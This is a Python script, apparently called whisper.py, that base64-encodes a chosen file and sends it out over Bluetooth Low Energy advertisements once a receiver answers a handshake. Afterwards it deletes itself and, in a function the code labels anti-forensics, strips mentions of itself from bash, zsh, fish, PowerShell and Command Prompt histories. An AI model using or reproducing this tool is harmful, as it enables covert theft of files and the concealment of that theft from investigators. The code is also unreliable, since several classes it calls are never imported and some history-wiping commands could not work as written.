import time
import base64
import sys
import logging
import os

# pretty logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

# bluetooth uuids (using a custom pair to simulate proprietary software)
SERVICE_UUID = "64bcb849-9008-4f5f-9c11-9a80b5ab0652"  # Whisper UUID
CHARACTERISTIC_UUID = "64bcb849-9008-4f5f-9c11-9a80b5ab0652"  # Whisper characteristic UUID

# function to send encoded data
def transmit_encoded_data(encoded_file_data):
    try:
        logger.info("Transmitter: Broadcasting advertisement...")
        advertisement = Advertisement()
        advertisement.data = encoded_file_data.encode()
        advertisement.start()
        time.sleep(3)  # Broadcast for 3 seconds
        advertisement.stop()
        logger.info("Transmitter: Advertisement complete.")
    except KeyboardInterrupt:
        logger.info("Transmitter: Advertisement canceled.")
    except Exception as e:
        logger.error("Transmitter: Error occurred during transmission:", exc_info=True)

# self destruct for anti-forensics
def self_destruct():
    try:
        # self destruct
        script_path = sys.argv[0]
        if os.path.exists(script_path):
            os.remove(script_path)
            logger.info("Transmitter: Script file has been securely deleted.")

        # cleans script from known shell history files
        shell = os.getenv("SHELL")
        if shell:
            if "bash" in shell:
                os.system("history -d $(history | grep whisper.py | awk '{print $1}')")
                logger.info("Transmitter: Mentions of script removed from Bash history.")
            elif "zsh" in shell:
                os.system("sed -i '' '/whisper.py/d' ~/.zsh_history")
                logger.info("Transmitter: Mentions of script removed from Zsh history.")
            elif "fish" in shell:
                os.system("sed -i '' '/whisper.py/d' ~/.local/share/fish/fish_history")
                logger.info("Transmitter: Mentions of script removed from Fish history.")
            elif "powershell" in shell.lower():
                os.system("Clear-History -CommandLine *whisper.py*")
                logger.info("Transmitter: Mentions of script removed from PowerShell history.")
            elif "cmd.exe" in shell.lower() or "powershell.exe" in shell.lower():
                os.system("doskey /REInstall")
                logger.info("Transmitter: Mentions of script removed from Command Prompt history.")
    except Exception as e:
        logger.error(f"Transmitter: Error occurred during self-destruct: {e}")
    finally:
        sys.exit(0)

# transmission handler
def handler_transmitter(file_path):
    try:
        # make sure file exists
        if not file_path:
            logger.error("Transmitter: File path not provided.")
            return
        
        # encode file to base64
        with open(file_path, "rb") as file:
            file_content = file.read()
        encoded_file_data = base64.b64encode(file_content).decode()

        # authentication loop
        while True:
            # handshake SYN
            logger.info("Transmitter: Performing handshake...")
            scanner = Scanner().withDelegate(DefaultDelegate())
            devices = scanner.scan(3)  # scan in 3 second intervals
            for device in devices:
                if device.getValueText(9) == "RECEIVER_ACK":  # check for handshake ackowledgement
                    logger.info("Transmitter: ACK received from receiver.")
                    transmit_encoded_data(encoded_file_data)
                    self_destruct()
                    return 
            
            logger.error("Transmitter: Handshake failed. Receiver not found. Retrying...")
            time.sleep(5)  # wait 5 seconds before trying again
    except FileNotFoundError:
        logger.error(f"Transmitter: File '{file_path}' not found.")
    except Exception as e:
        logger.error("Transmitter: Error occurred during initialization:", exc_info=True)

if __name__ == "__main__":
    # check for args
    if len(sys.argv) < 2:
        logger.error("Usage: python whisper.py <file_path>")
        sys.exit(1)

    file_path = sys.argv[1]
    logger.info(f"Transmitter: Starting transmission of file '{file_path}'...")
    handler_transmitter(file_path)
